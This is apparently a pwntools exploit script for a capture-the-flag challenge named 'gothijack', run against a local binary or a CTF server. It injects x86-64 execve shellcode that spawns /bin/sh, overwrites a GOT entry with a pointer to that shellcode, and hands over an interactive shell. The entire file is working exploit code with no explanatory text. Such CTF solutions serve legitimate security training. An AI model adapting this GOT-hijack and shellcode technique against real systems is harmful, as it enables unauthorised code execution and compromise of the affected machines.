from pwn import *
from pwnlib import shellcraft
from pwn import asm, process, connect
import time

if args['REMOTE']:
    p = connect('csie.ctf.tw', 10129)
else:
    p = process('./gothijack-2586ada3c6815e1ad4656d704ecfc03f86bc1b00')

shellcode = '\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x31\xc0\x99\x31\xf6\x54\x5f\xb0\x3b\x0f\x05'
payload = 'a\0' + shellcode
address_write = '601020'
value_write = p64(0x6010a2)

p.sendline(payload)
p.sendline(address_write)
time.sleep(1)
p.send(value_write)
p.interactive()
